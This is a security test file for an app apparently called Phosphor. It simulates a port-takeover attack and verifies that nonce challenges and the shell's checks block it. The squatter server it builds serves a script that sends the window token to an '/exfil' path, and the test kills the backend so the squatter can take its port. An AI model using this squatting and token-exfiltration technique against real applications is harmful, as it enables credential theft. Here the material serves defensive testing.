// HIGH-3 of the 2026-10-01 audit: the port takeover. The shell knew its backend by the boot nonce,
// and the backend echoed that nonce in `x-phosphor` on every answer, token-free routes included. A
// same-user process read it once, ended the backend (it can), bound the port inside the respawn
// backoff and answered with the nonce: the shell took it for its own backend, and the open window
// went on posting the window token to it. Now the nonce never leaves the backend (each request the
// shell trusts carries a fresh challenge, answered with HMAC-SHA256 under the nonce), the window is
// torn down the moment its backend dies, and a respawn never opens onto a port someone else holds.
//
// Backend half (always): everything a token-free reader can see carries no nonce; two challenges get
// two proofs, each the HMAC the shell computes (src-tauri/src/backend.rs, identity_proof); the attacker
// then kills the backend and takes the port, and nothing it captured answers the next challenge.
// Shell half (with a built bundle): the real shell on a throwaway HOME, its backend killed and its
// port taken by a squatter that replays what it read and serves a page that would hand it the window
// token. The shell refuses to restart onto it, and no request carrying a credential reaches it.
// Reads half (round 2): the shell's own reads (Copy MCP line, Copy Log, the update's health gate)
// leave before their answer's challenge is checked, so a squatter reads their heads. They carry the
// read key, which opens only reads, and never the token: the read key opens each read the shell
// makes on the real backend, and the shell's own read code, run against a squatter on a real socket
// (its port-takeover tests in src-tauri), hands it no token. Menu clicks cannot be scripted here,
// so that half runs the shell's code through cargo.

import { spawnSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { bootBackend, launchShell, sleep } from '../harness.ts';
import type { AttackCase, AttackCtx, AttackResult } from '../types.ts';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
const proof = (nonce: string, challenge: string): string => crypto.createHmac('sha256', nonce).update(`phosphor identity\n${challenge}`).digest('hex');
// What the shell sends on every read instead of the token (src-tauri/src/backend.rs read_key).
const readKey = (token: string): string => crypto.createHmac('sha256', token).update('phosphor read key').digest('hex');
const fresh = (): string => crypto.randomBytes(32).toString('hex');

type Seen = { method: string; url: string; headers: http.IncomingHttpHeaders; body: string };

// A squatter on the port: answers everything 200, wears the identity value it captured, and serves a
// page whose script would send the window token back to it if a window ever loaded it.
async function squat(port: number, wear: string): Promise<{ seen: Seen[]; close(): Promise<void> }> {
  const seen: Seen[] = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (d: Buffer) => (body += d.toString()));
    req.on('end', () => {
      seen.push({ method: req.method ?? '', url: req.url ?? '', headers: req.headers, body });
      const page = '<!doctype html><title>Phosphor</title><script>fetch("/exfil?t=" + encodeURIComponent(String(window.__PHOSPHOR_TOKEN__ || "")))</script>';
      const html = (req.url ?? '/') === '/';
      res.writeHead(200, { 'x-phosphor': wear, 'content-type': html ? 'text/html' : 'application/json' });
      res.end(html ? page : JSON.stringify({ ok: true, version: '0.10.13' }));
    });
  });
  for (let i = 0; i < 50; i++) {
    const bound = await new Promise<boolean>((resolve) => {
      server.once('error', () => resolve(false));
      server.listen(port, '127.0.0.1', () => resolve(true));
    });
    if (bound) return { seen, close: () => new Promise<void>((r) => server.close(() => r())) };
    await sleep(20);
  }
  throw new Error(`the squatter could not take 127.0.0.1:${port}`);
}

// A request that carried the window token (header, JSON body or query) or its read key.
function credentialIn(s: Seen): 'token' | 'read key' | null {
  if (s.headers['x-phosphor-token'] !== undefined || /(^|[?&])token=/.test(s.url) || /"token"\s*:/.test(s.body) || s.url.startsWith('/exfil')) return 'token';
  if (s.headers['x-phosphor-read'] !== undefined || /(^|[?&])read=/.test(s.url)) return 'read key';
  return null;
}

async function backendHalf(problems: string[], rows: string[]): Promise<void> {
  const app = await bootBackend();
  let squatter: Awaited<ReturnType<typeof squat>> | null = null;
  try {
    // 1. Every token-free answer, headers and body, as a local process sees them.
    const seen: string[] = [];
    const worn = new Set<string>();
    for (const [method, route] of [['GET', '/'], ['GET', '/api/health'], ['GET', '/api/state'], ['GET', '/no-such-page'], ['POST', '/api/lock']] as const) {
      const res = await fetch(`${app.base}${route}`, method === 'POST' ? { method, headers: { 'content-type': 'application/json', origin: app.base }, body: '{}' } : {});
      res.headers.forEach((v, k) => seen.push(`${k}: ${v}`));
      seen.push(await res.text());
      worn.add(res.headers.get('x-phosphor') ?? '');
    }
    const leaked = seen.some((s) => s.toLowerCase().includes(app.nonce.toLowerCase()));
    rows.push(`token-free answers: ${seen.length / 2 | 0} read, x-phosphor worn ${JSON.stringify([...worn])}, nonce shown=${leaked}`);
    if (leaked) problems.push('the boot nonce is readable off the port without any credential');

    // 2. The proof is per challenge and only the nonce's holder can make it.
    const [c1, c2] = [fresh(), fresh()];
    const a1 = (await fetch(`${app.base}/`, { headers: { 'x-phosphor-challenge': c1 } })).headers.get('x-phosphor') ?? '';
    const a2 = (await fetch(`${app.base}/api/health`, { headers: { 'x-phosphor-challenge': c2 } })).headers.get('x-phosphor') ?? '';
    const proves = a1 === proof(app.nonce, c1) && a2 === proof(app.nonce, c2) && a1 !== a2;
    rows.push(`challenge proofs match the shell's HMAC=${proves}`);
    if (!proves) problems.push('the backend does not answer each challenge with its own proof');

    // 2b. The read key opens every read the shell makes, with no token on the request.
    const key = readKey(app.token);
    const opened: string[] = [];
    for (const route of ['/api/health', '/api/log?limit=5&for=report', '/api/connection']) {
      const res = await fetch(`${app.base}${route}`, { headers: { 'x-phosphor-read': key, 'x-phosphor-challenge': fresh() } });
      const body = await res.text();
      const ok = route === '/api/health' ? res.status === 200 && /"locked":/.test(body) : res.status !== 401;
      opened.push(`${route.split('?')[0]} ${res.status}${ok ? '' : ' REFUSED'}`);
      if (!ok) problems.push(`the read key does not open the shell's read of ${route.split('?')[0]}`);
    }
    rows.push(`the shell's reads with the read key alone: ${opened.join(', ')}`);

    // 3. The attacker ends the backend and takes the port. Nothing it captured answers the next
    //    challenge the shell would send.
    app.proc.kill('SIGKILL');
    await new Promise<void>((r) => (app.proc.exitCode !== null ? r() : app.proc.once('exit', () => r())));
    squatter = await squat(app.port, a1);
    const c3 = fresh();
    const captured = [...worn, a1, a2];
    const answers = captured.filter((v) => v === proof(app.nonce, c3));
    rows.push(`port taken by the squatter; ${captured.length} captured values answer a fresh challenge: ${answers.length}`);
    if (answers.length > 0) problems.push('a value the squatter captured answers the next challenge');
  } finally {
    if (squatter) await squatter.close();
    await app.stop();
  }
}

async function shellHalf(bundle: string, problems: string[], rows: string[]): Promise<void> {
  const shell = await launchShell({ app: bundle, bootTimeoutMs: 25_000 });
  let squatter: Awaited<ReturnType<typeof squat>> | null = null;
  try {
    // Let the window load and open its event stream, so its reconnect is part of the race.
    await sleep(3000);
    const worn = (await fetch(`${shell.base}/`)).headers.get('x-phosphor') ?? '';
    const pids = shell.sidecarPids();
    for (const pid of pids) process.kill(pid, 'SIGKILL');
    squatter = await squat(shell.port, worn);
    let refused = false;
    for (let i = 0; i < 60 && !refused; i++) {
      refused = /something else took 127\.0\.0\.1/.test(shell.output());
      if (!refused) await sleep(250);
    }
    const carried = squatter.seen.map((s) => [s, credentialIn(s)] as const).filter(([, c]) => c !== null);
    const tokens = carried.filter(([, c]) => c === 'token');
    const readKeys = carried.filter(([, c]) => c === 'read key');
    const challenged = squatter.seen.filter((s) => s.headers['x-phosphor-challenge'] !== undefined).length;
    rows.push(
      `shell: backend ${pids.join(',')} killed, port taken; shell refused to restart onto it=${refused}; squatter got ${squatter.seen.length} requests (${challenged} challenged), token-bearing ${tokens.length}, read-key-bearing ${readKeys.length} [${squatter.seen.map((s) => `${s.method} ${s.url.split('?')[0]}`).join(', ')}]`,
    );
    if (!refused) problems.push('the shell did not refuse the port it found taken');
    if (tokens.length > 0) problems.push(`the window token reached the squatter: ${tokens.map(([s]) => `${s.method} ${s.url.split('?')[0]}`).join(', ')}`);
  } finally {
    if (squatter) await squatter.close();
    await shell.stop();
  }
}

function readsHalf(problems: string[], rows: string[]): void {
  if (!fs.existsSync(path.join(ROOT, 'src-tauri', 'payload', 'phosphor.sha256'))) {
    rows.push('shell reads half skipped: no staged payload for the shell to build against (npm run bundle)');
    return;
  }
  const run = spawnSync('cargo', ['test', '--manifest-path', path.join(ROOT, 'src-tauri', 'Cargo.toml'), 'squatter'], { encoding: 'utf8', timeout: 600_000 });
  if (run.error !== undefined) {
    rows.push(`shell reads half skipped: ${run.error.message}`);
    return;
  }
  const results = [...(run.stdout ?? '').matchAll(/test result: (ok|FAILED)\. (\d+) passed; (\d+) failed/g)];
  const passed = results.reduce((n, r) => n + Number(r[2]), 0);
  const failed = results.reduce((n, r) => n + Number(r[3]), 0);
  const names = [...(run.stdout ?? '').matchAll(/^test (\S+) \.\.\. (ok|FAILED)$/gm)].map((m) => `${m[1].split('::').at(-1)} ${m[2]}`);
  rows.push(`shell reads against a squatter (cargo test squatter): ${passed} passed, ${failed} failed [${names.join(', ')}]`);
  if (run.status !== 0 || failed > 0 || passed < 4) problems.push(`the shell's reads against a squatter did not hold: cargo exited ${run.status}, ${passed} passed, ${failed} failed`);
}

export const attack: AttackCase = {
  id: '17-port-takeover',
  title: 'a process that kills the backend and takes its port learns no nonce, answers no challenge, and gets no token',
  timeoutMs: 600_000,
  async run(ctx: AttackCtx): Promise<AttackResult> {
    const problems: string[] = [];
    const rows: string[] = [];
    await backendHalf(problems, rows);
    readsHalf(problems, rows);
    const bundle = ctx.signedApp ?? ctx.builtApp;
    if (bundle) await shellHalf(bundle, problems, rows);
    else rows.push('shell half skipped: no built bundle (npm run app:build)');
    return {
      expected: 'no nonce on any token-free answer; each challenge gets its own HMAC proof; nothing captured answers a fresh challenge; the shell reads with the read key, which opens its reads, and hands a squatter no token; the real shell refuses a taken port and no token reaches the squatter',
      observed: problems.length === 0 ? 'the takeover gets nothing it can use' : problems.join('; '),
      pass: problems.length === 0,
      evidence: rows.join(' | '),
    };
  },
};

export default attack;
